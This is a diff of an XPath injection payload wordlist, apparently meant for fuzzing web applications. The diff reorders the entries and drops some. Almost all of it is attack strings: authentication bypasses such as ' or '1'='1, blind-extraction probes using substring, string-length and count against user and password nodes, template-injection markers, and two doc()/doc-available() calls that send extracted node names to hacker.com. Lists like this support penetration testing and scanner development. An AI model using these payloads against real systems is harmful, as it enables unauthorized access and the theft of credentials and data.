@@ -1,102 +1,101 @@
-" or ""="
-" or "1"="1
 $
 %
-&apos;XoiZR
-&lt;% Tnn96 %&gt;
-&lt;%= Tnn96 %&gt;
-&lt;? Tnn96 ?&gt;
-&lt;?Tnn96 ?&gt;
-&lt;Tnn96&gt;
-&quot;XoiZR
-' and count(/*)=1 and '1'='1
-' and count(/@*)=1 and '1'='1
-' and count(/comment())=1 and '1'='1
-' or "a" or '
+*
++
+-
+/
+:
+;
+@
+-1
+//
+@*
+*/*
+//*
+name
+null
+true
+false
+//name
+(Tnn96)
+[Tnn96]
+{Tnn96}
+{{Tnn96}}" or ""="
 ' or ''='
-' or '1'='1
-' or /* or '
-' or 1 or '
+user/name
+{= Tnn96}
 ' or 1]%00
-' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
-' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
-' or true() or '
+/user/name
+user//name
+" or "1"="1
+&apos;XoiZR
+&quot;XoiZR
+' or '1'='1
+' or 1 or '
+//user/name
+admin' or '
+{{= Tnn96}}
+' or /* or '
+&lt;Tnn96&gt;
+' or "a" or '
+//name/node()
+//user/node()
 ') or 1=1 or ('
-') or 1=1] | //user/password[('')=('
-') or 2=1] | //user/node()[('')=('
-')] | //./node()[('')=('
-')] | //node()[('')=('
+&lt;?Tnn96 ?&gt;
+' or true() or '
+admin' or '1'='2
+&lt;% Tnn96 %&gt;
+&lt;? Tnn96 ?&gt;
+&lt;%= Tnn96 %&gt;
+and count(/*) = 1 
 ')] | //password%00
+x' or 1=1 or 'x'='y
+'or position()=2 or'
+//name/child::node()
+//user/child::node()
+count(//user/node())
+count(/child::node())
+')] | //node()[('')=('
+')]/../*[3][text()!=('
+and count(/*[1]/*) = 2 
+')] | //./node()[('')=('
 ')] | //user/*[1] | a[('
 ')] | //user/*[2] | a[('
 ')] | //user/*[3] | a[('
 ')] | //user/*[4] | a[('
-')]/../*[3][text()!=('
 'or contains(.,'adm') or'
-'or contains(name,'adm') or'
-'or position()=2 or'
-'or string-length(name(.))<10 or'
-(Tnn96)
-*
-*/*
-+
--
--1
-/
-//
-//*
-//name
-//name/child::node()
-//name/node()
-//user/child::node()
-//user/name
-//user/node()
-//user[last()-1]/name #mark
-//user[position()=1]/child::node()[position()=2]
 //user[position()=1]/name
-/user/name
-:
-;
-@
-@*
-admin' or '
-admin' or '1'='2
-and count(/*) = 1 
-and count(/*[1]/*) = 2 
-and count(/*[1]/*[1]/*) = 1 
-and count(/*[1]/*[1]/*[1]/*) = 0 
+and name(/*[1]) = "root" 
+//user[last()-1]/name #mark
 and count(/*[1]/*[2]/*) = 3
+' and count(/*)=1 and '1'='1
+'or contains(name,'adm') or'
+and count(/*[1]/*[1]/*) = 1 
+' and count(/@*)=1 and '1'='1
 and count(/*[1]/*[2]/*[1]/*) = 0
 and count(/*[1]/*[2]/*[2]/*) = 0
 and count(/*[1]/*[2]/*[3]/*) = 1
-and count(/*[1]/*[2]/*[3]/[1]*) = 0
-and name(/*[1]) = "root" 
-and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105
-and substring(name(/*[1]/*[1]),1,1) = "a" 
-count(//user/node())
-count(/child::node())
-doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
-doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
-false
-name
-null
-search=')] | //user/*[contains(*,'
-search=Har') and contains(../password,'c
-search=Har') and starts-with(../password,'c
-string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
-string(//user[name/text()='' or true() or '' and password/text()='']/account/text())
-string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())
-string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
-string-length(//user[position()=1]/child::node()[position()=1])
-substrig(//user[position()=2/child::node()[position()=1],2,1)
-substring(//user[userid=5]/username,2,1)="a"
-true
-user//name
-user/name
-x' or 1=1 or 'x'='y
+'or string-length(name(.))<10 or'
+and count(/*[1]/*[1]/*[1]/*) = 0 
 x' or name()='username' or 'x'='y
-[Tnn96]
-{= Tnn96}
-{Tnn96}
-{{= Tnn96}}
-{{Tnn96}}
+') or 2=1] | //user/node()[('')=('
+search=')] | //user/*[contains(*,'
+and count(/*[1]/*[2]/*[3]/[1]*) = 0
+' and count(/comment())=1 and '1'='1
+') or 1=1] | //user/password[('')=('
+search=Har') and contains(../password,'c
+and substring(name(/*[1]/*[1]),1,1) = "a" 
+search=Har') and starts-with(../password,'c
+substring(//user[userid=5]/username,2,1)="a"
+//user[position()=1]/child::node()[position()=2]
+substrig(//user[position()=2/child::node()[position()=1],2,1)
+string-length(//user[position()=1]/child::node()[position()=1])
+and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105
+' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
+doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
+' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
+string(//user[name/text()='' or true() or '' and password/text()='']/account/text())
+string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
+doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
+string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())
+string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
